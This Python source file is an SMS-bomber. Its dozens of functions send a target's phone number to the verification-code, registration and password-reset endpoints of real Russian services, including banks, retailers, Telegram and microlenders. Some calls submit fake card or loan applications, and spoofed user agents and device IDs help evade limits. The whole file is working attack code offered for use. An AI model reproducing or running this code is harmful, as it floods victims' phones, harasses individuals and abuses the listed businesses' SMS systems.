# Post запросы:
from requests import post
from user_agent import generate_user_agent
from random import randint
import time
def mv(number,n=1):
    for _ in range(n):
        r = post('https://mv.com.ru/api/v1/send-code', data={'phone': f"{number}"})
        if r.status_code == 200:
            return '✅ Мир Возможностей отправлено'
        else:
            return '⚠️ Мир Возможностей не отправлено'
        time.sleep(1)

def dns(number,n=1,is_call =0):
    for i in range(n):
        r = post("https://www.dns-shop.ru/auth/auth/fast-authorization/",
                 data={"FastAuthorizationLoginLoadForm[login]:": f"{number}",
                       "FastAuthorizationLoginLoadForm[token]": "",
                       "FastAuthorizationLoginLoadForm[isPhoneCall]": is_call})
        if r.status_code == 200:
            return '✅ DNS отправлено'
        else:
            return '⚠️ DNS не отправлено'
        if i != n-1:
            time.sleep(30)

def sm_center(number,n=1):
    f_number = format_phone(number, "+# (###) ### ## ##")
    for _ in range(n):
        r = post('https://api.sm-center.ru/vremya/Auth/SendCheckCode',
                 json={"phone": f_number})
        if r.status_code == 200:
            return '✅ Наш дом отправлено'
        else:
            return '⚠️ Наш дом не отправлено '

def citilink(number,n=1):
    for _ in range(n):
        r = post('https://www.citilink.ru/registration/confirm/phone/+' + number + '/')
        if r.status_code == 200:
            return '✅ Ситилинк отправлено'
        else:
            return '⚠️ Ситилинк не отправлено'


def gorpay(number,n=1):
    for _ in range(n):
        r = post('https://api.gorpay.online/profile/Register/SendSmsCode2',
                 data={'PhoneNumber': number, 'SmsCodeReason': 'Registration'})
        if r.status_code == 200:
            return '✅ Регистрация Gorpay отправлено'
        else:
           return '⚠️ Регистрация Gorpay не отправлено'
        r = post('https://api.gorpay.online/profile/Register/SendOtpCode2',
                 data={'PhoneNumber': number, 'OtpCodeReason': 'ResetPassword', 'OtpProviderType': 'Sms'})
        if r.status_code == 200:
            return '✅ Востановление пароля Gorpay отправлено'
        else:
            return '⚠️ Востановление пароля Gorpay не отправлено'


def moe_online(number,n=1):
    for _ in range(n):
        r = post('https://moe-online.ru/register',
                 data={'number_phone': number,
                       'password': '123456', 'approv': True,
                       'name': 'WEFWEF', '_method': 'POST'})
        if r.status_code == 200:
            return '✅ moe-online отправлено'
        else:
            return '⚠️ moe-online не отправлено'


def avon(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post('https://avon.ru/api/authentication_code', json={'phone': f_number, 'channel': 'SMS'})
        if r.status_code == 200:
            return '✅ Avon отправлено'
        else:
            return '⚠️ Avon не отправлено'


def alfabank(number,n=1):
    for _ in range(n):
        r = post('https://alfabank.ru/api/v1/form-sender-dc/v2/applications',
                 json={'cardId': 'RR', 'packageId': 'T04', 'contractId': 'PDRR', 'email': 'ch@ya.ru',
                       'embossingName': 'BB AA', 'firstName': 'Бб', 'lastName': 'Аа', 'middleName': 'Вв',
                       'passportBirthDate': '2000-01-01', 'mobilePhone': number[-10:], 'sex': 'm',
                       'sopdConfirmed': True, 'additionalServices': [], 'abTest': '',
                       'platformId': 'alfaonline_unauth_dc_newp'},
                 headers={'referer': 'https://alfabank.ru/lp/retail/debit/promo/dcnewclients/'})
        if r.status_code == 200:
            return '✅ Alpha-Bank отправлено'
        else:
            return '⚠️ Alpha-Bank не отправлено'


def zaymer(number,n=1):
    for _ in range(n):
        r = post('https://www.zaymer.ru/api/v3/registration/otp', json={"phone": int(number)})
        if r.status_code == 200:
            return '✅ Займер отправлено'
        else:
            return '⚠️ Займер не отправлено'


def lenta(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(), "DeviceID": "3ea24583-84da-1bd8-005d-2b9f11bf0df3",
                   "X-Platform": "omniweb", "X-Retail-Brand": "lo"}
        r = post('https://lenta.com/api-gateway/v1/auth/code/send', json=
        {"acceptMarketingCommunications": True,
         "kfpKsid": "ca3289f7-4e00-4d2d-8d81-f2de9f0ad17e",
         "kfpVn": None,
         "phone": number}, headers=headers)
        if r.status_code == 200 and r.json().get('sent'):
            return '✅ Лента отправлено'
        else:
            return '⚠️ Лента не отправлено'


def wildberries(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(),
                   "deviceid": f'site_{randint(10000, 99999)}as9232145d0ad4a88be4125350c'}
        r = post('https://wbx-auth.wildberries.ru/v2/code/wb-captcha',
                 json={"phone_number": number, "captcha_token": ''}, headers=headers)
        if r.status_code == 200:
            return '✅ Wildberries отправлено'
        else:
            return '⚠️ Wildberries не отправлено'


def kviku(number,n=1):
    f_number = format_phone(number, "+#-###-###-####")
    for _ in range(n):
        r = post('https://kviku.ru/cards/default/SendCodeApproveDocs', data={'phone': f_number})
        if r.status_code == 200 and r.json().get('status') == 'success':
            return '✅ kviku отправлено'
        else:
            return '⚠️ kviku не отправлено'


def telegram(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post("https://my.telegram.org/auth/send_password", data={"phone": f_number})
        if r.status_code == 200 and r.text != 'Sorry, too many tries. Please try again later.':
            return '✅ Telegram отправлено'
        else:
            return '⚠️ Telegram не отправлено'


def mm(number,n =1):
    for _ in range(n):
        r = post('https://api.business.kazanexpress.ru/api/restore', json={"login": number[1:]})
        if r.status_code == 200 and r.text:
            return '✅ Магнит Маркет отправлено'
        else:
            return '⚠️ Магнит Маркет не отправлено'

def rossko(number, n=1):
    for _ in range(n):
        r = post(
            'https://rossko.ru/customer/auth/',
            data={'action': 'registerByPhone', 'realPhone': f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'}
        )
        if r.status_code == 200:
            return '✅ Rossko отправлено'
        else:
            return '⚠️ Rossko не отправлено'
        time.sleep(1)
 
 
def apteka(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.apteka.ru/Auth/Auth_Code',
            json={'phone': f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'}
        )
        if r.status_code == 200:
            return '✅ Apteka.ru отправлено'
        else:
            return '⚠️ Apteka.ru не отправлено'
        time.sleep(1)
 
 
def magnit(number, n=1):
    for _ in range(n):
        r = post(
            'https://id.magnit.ru/v3/auth/signin',
            json={'phone': number[1:], 'device_id': '66d050cd8fd4e15a'}
        )
        if r.status_code == 200:
            return '✅ Магнит отправлено'
        else:
            return '⚠️ Магнит не отправлено'
        time.sleep(1)
 
 
def webbankir(number, n=1):
    for _ in range(n):
        r = post(
            'https://ng-api.webbankir.com/api/auth/newCode/',
            json={'phone': number}
        )
        if r.status_code == 200:
            return '✅ Webbankir отправлено'
        else:
            return '⚠️ Webbankir не отправлено'
        time.sleep(1)
 
 
def chetire_lapy(number, n=1):
    for _ in range(n):
        r = post(
            'https://4lapy.ru/api/auth/newCode/',
            json={'phone': number}
        )
        if r.status_code == 200:
            return '✅ 4lapy отправлено'
        else:
            return '⚠️ 4lapy не отправлено'
        time.sleep(1)
 
 
def papajohns(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.papajohns.ru/user/v2/phone_verification',
            json={'data': {'type': 'PhoneVerification', 'attributes': {'phone': number, 'webbankirCrossId': '8879b668-4734-4a47-97f0-c9af8b2acf94'}}}
        )
        if r.status_code == 200:
            return '✅ Papa Johns отправлено'
        else:
            return '⚠️ Papa Johns не отправлено'
        time.sleep(1)
 
 
def papajohns_signup(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.papajohns.ru/v2/users',
            json={'username': number, 'phone': number, 'app_version': 'v30'}
        )
        if r.status_code == 200:
            return '✅ Papa Johns signup отправлено'
        else:
            return '⚠️ Papa Johns signup не отправлено'
        time.sleep(1)
 
 
def valta(number, n=1):
    formatted = f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://valta.ru/bitrix/services/main/ajax.php',
            params={'mode': 'class', 'c': 'citfact:register', 'action': 'sendSms'},
            data={'phone': formatted}
        )
        if r.status_code == 200:
            return '✅ Valta отправлено'
        else:
            return '⚠️ Valta не отправлено'
        time.sleep(1)
 
 
def ecco(number, n=1):
    formatted = f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://ecco.ru/ajax/ajax.php',
            data={
                'ajax_event': 'set_auth_type',
                'event': 'ajax',
                'show_description': '1',
                'show_register': '1',
                'auth_type': 'phone',
                'phone_login': formatted
            }
        )
        if r.status_code == 200:
            return '✅ ECCO отправлено'
        else:
            return '⚠️ ECCO не отправлено'
        time.sleep(1)
 
 
def viled(number, n=1):
    for _ in range(n):
        r = post(
            'https://api-prod.viled.kz/identityabo/anonymousFlow/init',
            json={'phone': number[1:]}
        )
        if r.status_code == 200:
            return '✅ Viled.kz отправлено'
        else:
            return '⚠️ Viled.kz не отправлено'
        time.sleep(1)
 
 
def dostavista(number, n=1):
    for _ in range(n):
        r = post(
            'https://dostavista.ru/user/send-sms',
            json={'phone': number, 'source': 'signup'}
        )
        if r.status_code == 200:
            return '✅ Dostavista отправлено'
        else:
            return '⚠️ Dostavista не отправлено'
        time.sleep(1)
 
 
def lifemart(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.lifemart.ru/api/user/register',
            json={'verify_type': 'sms', 'phone': number[1:]}
        )
        if r.status_code == 200:
            return '✅ Lifemart отправлено'
        else:
            return '⚠️ Lifemart не отправлено'
        time.sleep(1)
 
 
def igooods(number, n=1):
    for _ in range(n):
        r = post(
            'https://igooods.ru/v2/otps',
            json={'phone': number}
        )
        if r.status_code == 200:
            return '✅ iGooods отправлено'
        else:
            return '⚠️ iGooods не отправлено'
        time.sleep(1)
 
 
def citydrive(number, n=1):
    for _ in range(n):
        r = post(
            'https://citydrive.ru/signup',
            params={'version': '21'},
            json={
                'os': 'web',
                'phone': number[1:],
                'phone_code': '7',
                'vendor_id': 'f7bbe719-2356-465f-8858-da1218847e81'
            }
        )
        if r.status_code == 200:
            return '✅ CityDrive отправлено'
        else:
            return '⚠️ CityDrive не отправлено'
        time.sleep(1)
 
 
def bolshoe_tv(number, n=1):
    for _ in range(n):
        r = post(
            'https://bolshoe.tv/v1/agregator/sendAuth',
            json={'auth_type': 'phone', 'uid': number}
        )
        if r.status_code == 200:
            return '✅ Bolshoe.tv отправлено'
        else:
            return '⚠️ Bolshoe.tv не отправлено'
        time.sleep(1)
 
 
def akbars(number, n=1):
    for _ in range(n):
        r = post(
            'https://online.akbars.ru/identityabo/anonymousFlow/init',
            json={'phone': number[1:]}
        )
        if r.status_code == 200:
            return '✅ Akbars отправлено'
        else:
            return '⚠️ Akbars не отправлено'
        time.sleep(1)
 
 
def nskbl(number, n=1):
    for _ in range(n):
        r = post(
            'https://www.nskbl.ru/api/ext/rshb-auth/send-verification-code-auth',
            json={'login': f'+{number}'}
        )
        if r.status_code == 200:
            return '✅ NSKBL отправлено'
        else:
            return '⚠️ NSKBL не отправлено'
        time.sleep(1)
 
 
def svoefermerstvo(number, n=1):
    for _ in range(n):
        r = post(
            'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth',
            json={'login': f'+{number}'}
        )
        if r.status_code == 200:
            return '✅ Своё Фермерство отправлено'
        else:
            return '⚠️ Своё Фермерство не отправлено'
        time.sleep(1)
 
 
def joy_money(number, n=1):
    for _ in range(n):
        r = post(
            'https://my.joy.money/',
            json={'phone': number, 'amount': '5500', 'days': '12'}
        )
        if r.status_code == 200:
            return '✅ Joy Money отправлено'
        else:
            return '⚠️ Joy Money не отправлено'
        time.sleep(1)

ALL = [
    rossko, apteka, magnit, webbankir, chetire_lapy,
    papajohns, papajohns_signup, valta, ecco, viled,
    dostavista, lifemart, igooods, citydrive, bolshoe_tv,
    akbars, nskbl, svoefermerstvo, joy_money
]



# Изменение формата номера
def format_phone(phone, phone_mask):
    phone_list = list(phone)
    for i in phone_list:
        phone_mask = phone_mask.replace("#", i, 1)
    return phone_mask
